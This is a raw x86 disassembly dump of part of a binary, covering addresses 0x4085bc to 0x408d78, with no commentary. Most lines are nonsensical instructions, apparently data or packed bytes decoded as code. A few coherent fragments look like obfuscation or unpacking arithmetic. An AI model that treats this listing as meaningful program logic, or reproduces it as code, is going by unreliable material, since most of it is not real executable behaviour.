  4085bc:	sub    edi,DWORD PTR [ebx+0x602cc267]
  4085c2:	dec    edx
  4085c3:	pop    ecx
  4085c4:	jl     0x408586
  4085c6:	leave  
  4085c7:	ror    edi,0x21
  4085ca:	cmc    
  4085cb:	mov    cl,0x3
  4085cd:	addr16 out dx,al
  4085cf:	ret    
  4085d0:	les    esp,FWORD PTR [ebp-0x53]
  4085d3:	xor    bh,BYTE PTR [edx]
  4085d5:	mov    BYTE PTR ds:0x44728aec,dh
  4085db:	adc    ch,ch
  4085dd:	cld    
  4085de:	int3   
  4085df:	iret   
  4085e0:	mov    esi,0x782f0740
  4085e5:	mov    edx,0xf095a8dd
  4085ea:	mov    esi,0x6f4780b5
  4085ef:	lods   al,BYTE PTR ds:[si]
  4085f1:	pop    ds
  4085f2:	or     BYTE PTR [eax],ch
  4085f4:	mul    BYTE PTR [eax]
  4085f6:	sbb    al,dh
  4085f8:	push   edi
  4085f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fa:	data16 out 0x6e,al
  4085fd:	add    BYTE PTR [esi+0x5f83e5f3],cl
  408603:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408605:	sbb    ecx,ebp
  408607:	test   al,0x71
  408609:	jnp    0x408689
  40860b:	scas   al,BYTE PTR es:[edi]
  40860c:	push   0xffffffcb
  40860e:	xchg   ebx,eax
  40860f:	add    al,0x44
  408611:	cmp    DWORD PTR [ecx],0x7f5888e3
  408617:	fninit 
  408619:	les    ebp,FWORD PTR [ebx+edx*2-0x6d]
  40861d:	mov    eax,0xf10a263e
  408622:	xchg   edi,eax
  408623:	cmp    BYTE PTR [ecx],ch
  408625:	sti    
  408626:	push   edi
  408627:	out    dx,eax
  408628:	leave  
  408629:	push   ebx
  40862a:	jle    0x40864a
  40862c:	cmc    
  40862d:	adc    al,0x61
  40862f:	add    bl,dl
  408631:	cld    
  408632:	test   eax,0x60c64908
  408637:	jbe    0x4085f3
  408639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863a:	enter  0xdf3a,0x34
  40863e:	addr16 pop ds
  408640:	adc    eax,0x23f57310
  408645:	mov    esi,0x4972701b
  40864a:	push   edi
  40864b:	sub    cl,0x65
  40864e:	ror    BYTE PTR [edx],cl
  408650:	dec    ebx
  408651:	daa    
  408652:	cmp    esi,edx
  408654:	std    
  408655:	js     0x408659
  408657:	mov    ebp,0x48c1f221
  40865c:	(bad)  
  40865e:	or     BYTE PTR [ebx],dh
  408660:	mov    ebp,0x84596758
  408665:	mov    edx,0xe2e42bce
  40866a:	into   
  40866b:	jae    0x4086e5
  40866d:	dec    ecx
  40866e:	sbb    al,bh
  408670:	int    0xca
  408672:	les    ebx,FWORD PTR [edx-0x5a]
  408675:	enter  0x19a2,0x2a
  408679:	push   eax
  40867a:	xchg   ecx,eax
  40867b:	cli    
  40867c:	cld    
  40867d:	loopne 0x40862c
  40867f:	retf   0x3967
  408682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408683:	arpl   WORD PTR [ebx+0x783d6388],si
  408689:	retf   0xaa59
  40868c:	bnd jl 0x4086c1
  40868f:	mov    al,ds:0x75953431
  408694:	mov    dh,0x33
  408696:	daa    
  408697:	js     0x4086e8
  408699:	add    bh,BYTE PTR [ebx-0x71ed0148]
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x17e70d4a],ecx
  4086ca:	cmp    al,0x8a
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	int    0x92
  4086d5:	add    BYTE PTR [ebp-0x20981d45],bl
  4086db:	pop    esp
  4086dc:	and    ecx,ecx
  4086de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086df:	cmc    
  4086e0:	sar    DWORD PTR [ecx-0x1783dd61],0x2f
  4086e7:	int    0xe9
  4086e9:	test   al,0xe6
  4086eb:	popa   
  4086ec:	aam    0x73
  4086ee:	jle    0x4086d0
  4086f0:	sbb    DWORD PTR [esp+ebp*4],0x36
  4086f4:	dec    ecx
  4086f5:	inc    esp
  4086f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f7:	test   DWORD PTR [edx+ebp*8-0x50],ebp
  4086fb:	and    al,0x75
  4086fd:	in     eax,dx
  4086fe:	gs cmc 
  408700:	jle    0x4086e5
  408702:	xchg   ebx,eax
  408703:	xor    dl,al
  408705:	out    dx,eax
  408706:	mov    bh,al
  408708:	push   cs
  408709:	mov    ds:0x85dd991c,eax
  40870e:	inc    esi
  40870f:	jnp    0x408774
  408711:	ficom  DWORD PTR [ebp-0x2b790bdd]
  408717:	daa    
  408718:	ficomp DWORD PTR [edi-0x73]
  40871b:	addr16 fsub st,st(2)
  40871e:	iret   
  40871f:	cmp    DWORD PTR [eax+0x15],esp
  408722:	cmc    
  408723:	sub    BYTE PTR [ecx+eiz*4],ch
  408726:	sbb    ebx,DWORD PTR [ecx-0x27]
  408729:	jecxz  0x408711
  40872b:	mov    al,ds:0xebe6846e
  408730:	jo     0x408736
  408732:	sub    BYTE PTR [ebx+0x65],0xa3
  408736:	sbb    bl,al
  408738:	push   ebx
  408739:	aaa    
  40873a:	pop    esi
  40873b:	mov    bl,0x20
  40873d:	jmp    0x408727
  40873f:	push   cs
  408740:	inc    ecx
  408741:	and    bl,BYTE PTR [eax]
  408743:	lods   eax,DWORD PTR ds:[esi]
  408744:	fcmovu st,st(4)
  408746:	jne    0x4086f9
  408748:	mov    ecx,0x63861e49
  40874d:	ss in  eax,dx
  40874f:	sub    BYTE PTR [eax-0x7d],dh
  408752:	data16 jae 0x4086f6
  408755:	shl    BYTE PTR [edx+0x32],0xa0
  408759:	xor    eax,0x2ab6c211
  40875e:	fsubr  st(5),st
  408760:	xor    eax,0x740861
  408765:	or     ah,BYTE PTR [ecx+0x19]
  408768:	aam    0x91
  40876a:	aad    0x64
  40876c:	sbb    eax,0xf27c41b2
  408771:	xor    dh,BYTE PTR [edx-0x71]
  408774:	mov    bh,cl
  408776:	adc    al,0xcd
  408778:	xor    DWORD PTR [ebx],ecx
  40877a:	pop    ss
  40877b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40877c:	test   BYTE PTR [eax+edx*8-0x6e225d80],ch
  408783:	push   es
  408784:	jl     0x4087ea
  408786:	push   ebx
  408787:	and    BYTE PTR [ebp+0x1],cl
  40878a:	adc    ebx,esi
  40878c:	and    dh,BYTE PTR [ebx+0x24958787]
  408792:	push   edx
  408793:	into   
  408794:	pop    ds
  408795:	cli    
  408796:	std    
  408797:	sub    eax,0x779a6136
  40879c:	scas   al,BYTE PTR es:[edi]
  40879d:	cmp    BYTE PTR [edx],0xda
  4087a0:	adc    eax,0xc56c368e
  4087a5:	push   es
  4087a6:	je     0x408824
  4087a8:	mov    BYTE PTR [edi+edx*1],al
  4087ab:	inc    ebx
  4087ac:	add    eax,0xd1095b32
  4087b1:	fistp  WORD PTR [ecx-0x620d91a5]
  4087b7:	mov    ebp,0xf94e0787
  4087bc:	ficom  WORD PTR [esi+0x7b]
  4087bf:	aad    0x8c
  4087c1:	mov    WORD PTR [ecx+0x22],gs
  4087c4:	cli    
  4087c5:	mov    bh,0xa0
  4087c7:	fadd   QWORD PTR [ebx+0x14]
  4087ca:	retf   0x7f3d
  4087cd:	in     eax,0x6
  4087cf:	mov    ch,0xd0
  4087d1:	cdq    
  4087d2:	clc    
  4087d3:	add    ah,BYTE PTR [ebp+0x3a245648]
  4087d9:	xor    al,0x6b
  4087db:	jle    0x4087ad
  4087dd:	push   0xdccddb3d
  4087e2:	push   eax
  4087e3:	cmp    dh,0xc3
  4087e6:	rol    bl,1
  4087e8:	fsub   DWORD PTR [edx+0x61bdca84]
  4087ee:	jg     0x4087d2
  4087f0:	and    ebx,DWORD PTR [ecx-0x12]
  4087f3:	or     dh,dh
  4087f5:	int3   
  4087f6:	inc    ebp
  4087f7:	adc    al,0x3d
  4087f9:	and    eax,0xcfcf2c80
  4087fe:	mov    ebx,0xca50e139
  408803:	shl    esi,0x4
  408806:	add    eax,0xdf24d4c8
  40880b:	dec    edx
  40880c:	push   edi
  40880d:	shl    esp,cl
  40880f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408810:	jb     0x4087b8
  408812:	stos   BYTE PTR es:[edi],al
  408813:	pop    ecx
  408814:	and    ecx,esi
  408816:	(bad)  
  408817:	mov    esi,0xf52fdb55
  40881c:	adc    cl,BYTE PTR [ebp-0x4c]
  40881f:	cwde   
  408820:	sub    al,0x4b
  408822:	mov    al,ds:0xbce7fa2b
  408827:	popf   
  408828:	inc    ecx
  408829:	sub    BYTE PTR [eax+0x202d725b],al
  40882f:	mov    cl,BYTE PTR [ebx+0x30]
  408832:	mov    ds:0x4e66ba13,eax
  408837:	mov    edx,0xcdbe0e65
  40883c:	cmp    eax,0xa0704834
  408841:	repnz cmp edi,DWORD PTR [edi]
  408844:	pop    edi
  408845:	xchg   ecx,eax
  408846:	pop    ebx
  408847:	mov    bl,dh
  408849:	add    dl,dl
  40884b:	pop    edx
  40884c:	xchg   ch,dl
  40884e:	cmp    ebp,DWORD PTR [esi+0x25990712]
  408854:	out    dx,al
  408855:	push   ds
  408856:	data16 ja 0x4088bf
  408859:	pop    ds
  40885a:	into   
  40885b:	jg     0x4087e7
  40885d:	mov    cl,0xee
  40885f:	xchg   esi,eax
  408860:	repnz cmp DWORD PTR [edx+eax*2+0x72],0x23
  408866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408867:	gs jnp 0x408812
  40886a:	xchg   esi,eax
  40886b:	popf   
  40886c:	jae    0x4088e0
  40886e:	push   es
  40886f:	jbe    0x40887d
  408871:	sbb    DWORD PTR [edx-0x7f481b95],ebp
  408877:	xchg   BYTE PTR [edi-0x29],cl
  40887a:	push   esi
  40887b:	mov    bh,0x3b
  40887d:	gs fst st(6)
  408880:	cmp    al,0xe8
  408882:	add    DWORD PTR [esi],esi
  408884:	pop    edx
  408885:	dec    edi
  408886:	mov    al,0x72
  408888:	cmc    
  408889:	out    0x5c,eax
  40888b:	jae    0x40881a
  40888d:	aam    0x9b
  40888f:	(bad)  
  408890:	pop    eax
  408892:	pop    esp
  408893:	pop    esp
  408894:	aam    0x7b
  408896:	dec    edi
  408897:	push   ss
  408898:	mov    al,ds:0x659f30b8
  40889d:	ficom  WORD PTR [ecx]
  40889f:	sbb    BYTE PTR [ebx-0x4deb8851],ah
  4088a5:	imul   edx,DWORD PTR [ecx+0x3b9ef88b],0x3e
  4088ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ad:	sti    
  4088ae:	mov    bh,0xd0
  4088b0:	jmp    0x7be6:0x6132c542
  4088b7:	jae    0x40889a
  4088b9:	add    ch,dl
  4088bb:	fiadd  DWORD PTR [ebx+eax*2-0x17]
  4088bf:	out    0x2d,al
  4088c1:	(bad)  
  4088c3:	xchg   edi,eax
  4088c4:	pushf  
  4088c5:	xchg   ecx,eax
  4088c6:	or     DWORD PTR [ecx+0x141dd0ad],esp
  4088cc:	nop
  4088cd:	inc    esp
  4088ce:	fcom   DWORD PTR [ebx-0x7f94443c]
  4088d4:	mov    edi,esp
  4088d6:	adc    esi,0x5227bceb
  4088dc:	pop    edi
  4088dd:	lock ss mov ebx,0xdcd780b7
  4088e4:	leave  
  4088e5:	aaa    
  4088e6:	push   0xffffffda
  4088e8:	push   es
  4088e9:	inc    ecx
  4088ea:	add    al,0xa6
  4088ec:	das    
  4088ed:	(bad)  
  4088ee:	int    0x7f
  4088f0:	mov    ah,0x4c
  4088f2:	imul   ebp,DWORD PTR [ecx],0xffffffb5
  4088f5:	clc    
  4088f6:	adc    edx,DWORD PTR [ebp+eiz*1-0x4f]
  4088fa:	es pop ebp
  4088fc:	add    BYTE PTR [ebx+0x63358100],cl
  408902:	ss inc ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x8cdbfb2c
  408968:	loopne 0x40891a
  40896a:	aam    0x7e
  40896c:	jle    0x408992
  40896e:	jl     0x4089ee
  408970:	jle    0x4089be
  408972:	mov    BYTE PTR [ebx],ah
  408974:	jl     0x408960
  408976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408977:	pop    edx
  408978:	iret   
  408979:	inc    esi
  40897a:	cld    
  40897b:	pop    edi
  40897c:	shl    BYTE PTR [ebp+0x1e],1
  40897f:	daa    
  408980:	push   esi
  408981:	mov    ds:0xd4124c92,al
  408986:	inc    edi
  408987:	test   BYTE PTR [ebp-0x7b4e7583],dh
  40898d:	int3   
  40898e:	test   DWORD PTR [edi-0x76],esp
  408991:	xchg   ebx,eax
  408992:	lds    edi,FWORD PTR [eax+0x6bc5f129]
  408998:	dec    edx
  408999:	loope  0x40896d
  40899b:	adc    DWORD PTR [edx],esi
  40899d:	ins    BYTE PTR es:[edi],dx
  40899e:	xchg   edi,eax
  40899f:	jo     0x408a10
  4089a1:	inc    eax
  4089a2:	test   DWORD PTR [ebp-0x471ebbe],0xd60880ab
  4089ac:	mov    dl,bl
  4089ae:	and    eax,DWORD PTR [esp+eiz*4+0x130a8bc9]
  4089b5:	mov    ch,0x24
  4089b7:	sbb    eax,0x9d36bce5
  4089bc:	xor    dl,BYTE PTR [edx+0x74b1eced]
  4089c2:	or     bh,BYTE PTR [ebp-0x67]
  4089c5:	loop   0x4089b4
  4089c7:	fistp  QWORD PTR [ecx*4+0xd14ab4f]
  4089ce:	(bad)  
  4089cf:	push   ecx
  4089d0:	aad    0x5b
  4089d2:	daa    
  4089d3:	dec    edi
  4089d4:	and    eax,0x78f3cb76
  4089d9:	cmp    BYTE PTR ds:0x4c69149e,cl
  4089df:	repnz pop ss
  4089e1:	and    esi,DWORD PTR [edi-0x67]
  4089e4:	inc    edi
  4089e5:	mov    esp,ss
  4089e7:	jnp    0x408a4b
  4089e9:	data16 aaa 
  4089eb:	xlat   BYTE PTR ds:[ebx]
  4089ec:	cmc    
  4089ed:	and    al,BYTE PTR ds:0xa3a7b815
  4089f3:	xchg   ebx,eax
  4089f4:	xchg   esi,eax
  4089f5:	pop    ebx
  4089f6:	sahf   
  4089f7:	pop    edi
  4089f8:	test   edx,ebp
  4089fa:	fcomp  QWORD PTR [ebx]
  4089fc:	test   esi,ebp
  4089fe:	das    
  4089ff:	inc    edi
  408a00:	loope  0x408a65
  408a02:	or     DWORD PTR [ebp+ebp*2-0x6bba5198],edi
  408a09:	jmp    0x6f7dc38d
  408a0e:	sub    al,0xe
  408a10:	out    dx,al
  408a11:	das    
  408a12:	mov    WORD PTR [esi],gs
  408a14:	pop    edx
  408a15:	sbb    ecx,DWORD PTR [edx-0x51b72f31]
  408a1b:	mov    dl,0x31
  408a1d:	adc    eax,DWORD PTR [ecx-0x3e]
  408a20:	mov    edi,0xc2935d00
  408a25:	dec    ecx
  408a26:	repz aam 0x63
  408a29:	jg     0x408a47
  408a2b:	mov    edi,0x78d4f740
  408a30:	inc    edi
  408a31:	add    eax,0x4a5d60e6
  408a36:	add    eax,0x786ba02a
  408a3b:	mov    eax,0x214bd490
  408a40:	push   DWORD PTR [eax+0x50]
  408a43:	jecxz  0x4089fe
  408a45:	pusha  
  408a46:	mov    BYTE PTR [edi+0x72],al
  408a49:	pop    edx
  408a4a:	fcom   st(6)
  408a4c:	loopne 0x408a9b
  408a4e:	das    
  408a4f:	ds jp  0x408a6b
  408a52:	call   0xa69f:0x889df763
  408a59:	xor    esp,DWORD PTR [esi-0x76]
  408a5c:	int3   
  408a5d:	cwde   
  408a5e:	arpl   WORD PTR [ecx],dx
  408a60:	xlat   BYTE PTR ds:[ebx]
  408a61:	nop
  408a62:	dec    esp
  408a63:	mov    dh,0x4b
  408a65:	pop    edi
  408a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a67:	cwde   
  408a68:	push   edx
  408a69:	rcr    esi,cl
  408a6b:	retf   
  408a6c:	ds cmp ebx,ebp
  408a6f:	inc    edi
  408a70:	dec    edx
  408a71:	push   es
  408a72:	push   edi
  408a73:	loope  0x408ae8
  408a75:	pop    ds
  408a76:	push   ebp
  408a77:	jbe    0x408a47
  408a79:	push   ds
  408a7a:	xchg   ebp,eax
  408a7b:	dec    ebx
  408a7c:	fadd   DWORD PTR [esi+0x49]
  408a7f:	ret    
  408a80:	xor    al,0x66
  408a82:	(bad)
  408a85:	or     edx,edi
  408a87:	ret    0xfd3b
  408a8a:	and    BYTE PTR [esi+0x23],ch
  408a8d:	test   BYTE PTR [ebx],ch
  408a8f:	lods   al,BYTE PTR ds:[esi]
  408a90:	mov    dh,0xd4
  408a92:	cdq    
  408a93:	aad    0xd4
  408a95:	cmp    DWORD PTR [esi-0x38c11fe],esi
  408a9b:	pusha  
  408a9c:	in     eax,0x25
  408a9e:	dec    esp
  408a9f:	jg     0x408a5a
  408aa1:	scas   eax,DWORD PTR es:[edi]
  408aa2:	loop   0x408a2c
  408aa4:	scas   eax,DWORD PTR es:[edi]
  408aa5:	out    0x7f,eax
  408aa7:	imul   edx,DWORD PTR [ecx-0x6d911b0b],0x31
  408aae:	pop    ds
  408aaf:	pushf  
  408ab0:	or     eax,0x715bbfa
  408ab5:	and    bl,dl
  408ab7:	mov    edx,0xd3506456
  408abc:	mov    al,0x60
  408abe:	dec    eax
  408abf:	or     al,0xfe
  408ac1:	mov    ebp,0x9d2484b8
  408ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ac7:	inc    eax
  408ac8:	mov    ebx,0xffce523
  408acd:	ins    DWORD PTR es:[edi],dx
  408ace:	xlat   BYTE PTR ds:[ebx]
  408acf:	jns    0x408ab9
  408ad1:	and    esp,DWORD PTR [eax]
  408ad3:	cli    
  408ad4:	add    ebp,DWORD PTR [eax+edi*1]
  408ad7:	in     al,0x72
  408ad9:	sbb    eax,0x96f76e3f
  408ade:	loope  0x408af1
  408ae0:	lods   eax,DWORD PTR ds:[esi]
  408ae1:	js     0x408ad6
  408ae3:	mov    ecx,0xc15e5e65
  408ae8:	sub    bh,cl
  408aea:	push   es
  408aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aec:	cmp    ecx,DWORD PTR [ebp+0x5febde16]
  408af2:	adc    BYTE PTR [ebx],bl
  408af4:	lock adc al,BYTE PTR [eax-0x45488ffc]
  408afb:	sahf   
  408afc:	les    edi,FWORD PTR [esi-0x3b]
  408aff:	mov    ebx,0xdb199af
  408b04:	ja     0x408b2a
  408b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b07:	pusha  
  408b08:	(bad)  
  408b09:	xor    DWORD PTR [edi-0x3d6be6b],ebx
  408b0f:	test   eax,0x209f4c3
  408b14:	lock test DWORD PTR [ebp-0x24ace5ae],esp
  408b1b:	iret   
  408b1c:	mov    ebp,0xa9ae3be0
  408b21:	push   0x67852c75
  408b26:	jp     0x408b17
  408b28:	dec    edx
  408b29:	jl     0x408acd
  408b2b:	loop   0x408b82
  408b2d:	add    al,0x88
  408b2f:	(bad)  
  408b30:	mov    esi,0x145b503c
  408b35:	imul   ebx,ebp,0xffffffdd
  408b38:	aas    
  408b39:	enter  0xad59,0x8f
  408b3d:	sub    DWORD PTR [ecx+0x9],eax
  408b40:	fs (bad) 
  408b43:	jmp    0x9433:0xc694cff4
  408b4a:	inc    edx
  408b4b:	or     al,bh
  408b4d:	stos   BYTE PTR es:[edi],al
  408b4e:	jnp    0x408b89
  408b50:	push   ebx
  408b51:	xor    BYTE PTR [edx+0x1625ee35],ch
  408b57:	mov    al,dl
  408b59:	inc    ecx
  408b5a:	xchg   ebx,eax
  408b5b:	dec    eax
  408b5c:	ret    
  408b5d:	xchg   ebp,eax
  408b5e:	inc    esp
  408b5f:	lahf   
  408b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b61:	repz sbb BYTE PTR [ebx-0x5795dea4],ah
  408b68:	xchg   edi,eax
  408b69:	mov    ds:0x7a322fcf,eax
  408b6e:	adc    eax,0x79136afe
  408b73:	sub    ah,ch
  408b75:	push   0x59
  408b77:	shl    BYTE PTR [edx-0x37],0x9d
  408b7b:	sahf   
  408b7c:	sbb    ch,BYTE PTR [esi-0x57]
  408b7f:	and    BYTE PTR gs:[ebx*1+0x6c68d621],bl
  408b87:	inc    ebx
  408b88:	or     BYTE PTR [esi-0x43b7625b],ch
  408b8e:	cmc    
  408b8f:	out    0x81,al
  408b91:	scas   al,BYTE PTR es:[edi]
  408b92:	mov    al,dl
  408b94:	test   ah,ah
  408b96:	or     BYTE PTR [ecx-0x73],0xb3
  408b9a:	inc    esp
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	dec    ebx
  408bf1:	jno    0x408bc4
  408bf3:	xchg   esp,eax
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	bnd jmp 0x408b83
  408bff:	sub    dl,dl
  408c01:	dec    ebp
  408c02:	or     esi,0xd
  408c05:	adc    DWORD PTR [ebx+0xa03b94],edi
  408c0b:	cdq    
  408c0c:	cs je  0x408bf8
  408c0f:	iret   
  408c10:	xchg   ebp,eax
  408c11:	stos   BYTE PTR es:[edi],al
  408c12:	neg    ecx
  408c14:	mov    al,ds:0xd9260dd1
  408c19:	iret   
  408c1a:	mov    esp,edi
  408c1c:	aam    0x9b
  408c1e:	aaa    
  408c1f:	sub    edi,DWORD PTR [ecx+eax*4+0x1663eb86]
  408c26:	inc    esp
  408c27:	cs imul esp,ecx,0xffffffb4
  408c2b:	es ret 0x8b44
  408c2f:	cld    
  408c30:	loope  0x408ca3
  408c32:	das    
  408c33:	int    0x1a
  408c35:	or     BYTE PTR [edx+0x66],bl
  408c38:	or     DWORD PTR [esi],esp
  408c3a:	sub    DWORD PTR [edx],ebp
  408c3c:	add    cl,BYTE PTR [ebp+0x3]
  408c3f:	mov    esp,0xbdb44f84
  408c44:	loop   0x408c17
  408c46:	call   0xd6ee:0x9409f8f1
  408c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c4e:	ror    DWORD PTR [ecx-0x3b],1
  408c51:	popf   
  408c52:	loope  0x408c79
  408c54:	rol    BYTE PTR [esp+ecx*8-0x6c57cd6],1
  408c5b:	xor    BYTE PTR [eax-0x496cdbed],cl
  408c61:	pop    ebx
  408c62:	jbe    0x408c39
  408c64:	pop    ds
  408c65:	ja     0x408cc5
  408c67:	fidiv  DWORD PTR [esi-0x34]
  408c6a:	in     eax,0x9
  408c6c:	cmp    dh,BYTE PTR [eax]
  408c6e:	inc    esp
  408c6f:	icebp  
  408c70:	fist   DWORD PTR [ebp-0x358919ca]
  408c76:	cld    
  408c77:	mov    ds:0xa68274f1,eax
  408c7c:	inc    ebx
  408c7d:	popf   
  408c7e:	adc    al,dl
  408c80:	adc    eax,0x1f109d1d
  408c85:	stc    
  408c86:	mov    ds:0xb770b92f,al
  408c8b:	or     DWORD PTR [ebx-0x74],esi
  408c8e:	sub    al,0xb9
  408c90:	adc    eax,0x9eed6c
  408c95:	push   ecx
  408c96:	dec    eax
  408c97:	jns    0x408c70
  408c99:	dec    ecx
  408c9a:	mov    ah,0x88
  408c9c:	xchg   ecx,eax
  408c9d:	cmp    eax,0xea3d8e80
  408ca2:	scas   eax,DWORD PTR es:[edi]
  408ca3:	in     al,dx
  408ca4:	sbb    BYTE PTR [eax],0x91
  408ca7:	dec    edi
  408ca8:	push   eax
  408ca9:	lods   al,BYTE PTR ds:[esi]
  408caa:	ja     0x408c76
  408cac:	or     al,0xa2
  408cae:	ins    DWORD PTR es:[edi],dx
  408caf:	xchg   BYTE PTR [esp+ebp*2],dl
  408cb2:	mov    edi,0x682aa091
  408cb7:	xor    cl,al
  408cb9:	dec    ebp
  408cba:	lahf   
  408cbb:	out    0x11,al
  408cbd:	xor    DWORD PTR [ecx],esi
  408cbf:	imul   bh
  408cc1:	sbb    DWORD PTR [edx-0x5],0x26
  408cc5:	icebp  
  408cc6:	lods   eax,DWORD PTR ds:[esi]
  408cc7:	mov    dh,bh
  408cc9:	mov    dl,0xf6
  408ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ccc:	mov    esi,0x41fb1a9c
  408cd1:	ds or  eax,0x43870c7d
  408cd7:	data16 aad 0x2c
  408cda:	jnp    0x408cf6
  408cdc:	(bad)  
  408cdd:	aam    0xf4
  408cdf:	out    dx,eax
  408ce0:	out    dx,eax
  408ce1:	jne    0x408c66
  408ce3:	stos   DWORD PTR es:[edi],eax
  408ce4:	cmp    al,bh
  408ce6:	out    dx,eax
  408ce7:	icebp  
  408ce8:	adc    DWORD PTR [eax+0x72a8c7b5],0x2e4e1eca
  408cf2:	aad    0x3b
  408cf4:	xor    ebp,0xe505fbb0
  408cfa:	push   eax
  408cfb:	push   esi
  408cfc:	xchg   ecx,edx
  408cfe:	cmp    dl,BYTE PTR [eax-0x11]
  408d01:	mul    BYTE PTR [edx]
  408d03:	sub    ch,cl
  408d05:	sub    eax,0x6fd763a2
  408d0a:	retf   
  408d0b:	stos   BYTE PTR es:[edi],al
  408d0c:	push   ss
  408d0d:	dec    esp
  408d0e:	(bad)  
  408d0f:	xor    esp,ecx
  408d11:	out    0x97,eax
  408d13:	mov    dl,0x31
  408d15:	(bad)  
  408d16:	cmp    esi,edx
  408d18:	add    eax,0x21839507
  408d1d:	test   DWORD PTR [ecx+0x75],esp
  408d20:	(bad)  
  408d21:	cdq    
  408d22:	push   ecx
  408d23:	xchg   esi,eax
  408d24:	lods   eax,DWORD PTR ds:[si]
  408d26:	xor    WORD PTR [esp+ecx*2],cx
  408d2a:	xchg   esi,eax
  408d2b:	fmul   DWORD PTR [eax]
  408d2d:	ret    
  408d2e:	inc    esp
  408d2f:	clc    
  408d30:	outs   dx,DWORD PTR ds:[esi]
  408d31:	call   0xd1e6:0x1167402d
  408d38:	xchg   edi,eax
  408d39:	icebp  
  408d3a:	mov    bl,0x4b
  408d3c:	lods   al,BYTE PTR ds:[esi]
  408d3d:	clc    
  408d3e:	dec    edx
  408d3f:	fs push ebp
  408d41:	inc    edi
  408d42:	push   esp
  408d43:	mov    ah,dl
  408d45:	pop    esp
  408d46:	xor    BYTE PTR [ebp-0x282c0a8c],dh
  408d4c:	stos   DWORD PTR es:[edi],eax
  408d4d:	sub    eax,esi
  408d4f:	cdq    
  408d50:	and    al,0xcf
  408d52:	out    0xfe,eax
  408d54:	dec    eax
  408d55:	xor    al,0xad
  408d57:	jge    0x408d85
  408d59:	add    esp,DWORD PTR [edi+0x10]
  408d5c:	lea    ebx,[ecx-0x5efe167a]
  408d62:	add    BYTE PTR [edx-0x1],dh
  408d65:	test   eax,0x9f498cf8
  408d6a:	pop    ss
  408d6b:	mov    edi,0x74fe89d2
  408d70:	mov    esi,0xe92a31c
  408d75:	pop    ecx
  408d76:	scas   eax,DWORD PTR es:[edi]
  408d77:	push   ebp
  408d78:	inc    edi
